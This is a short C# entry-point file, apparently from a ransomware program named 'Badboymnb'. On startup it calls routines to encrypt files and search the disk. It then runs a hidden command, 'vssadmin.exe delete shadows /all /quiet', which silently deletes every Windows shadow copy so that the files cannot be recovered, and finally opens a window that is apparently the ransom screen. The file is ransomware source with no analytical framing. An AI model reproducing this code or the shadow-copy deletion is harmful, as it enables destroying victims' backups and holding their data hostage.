using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Badboymnb;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		Badboymnb.Main.RunEncrypt();
		Badboymnb.Main.SearchDisk();
		DeleteShadowCopy();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}

	private static void DeleteShadowCopy()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process process = new Process
			{
				StartInfo = startInfo
			};
			process.Start();
		}
		catch (Exception)
		{
		}
	}
}
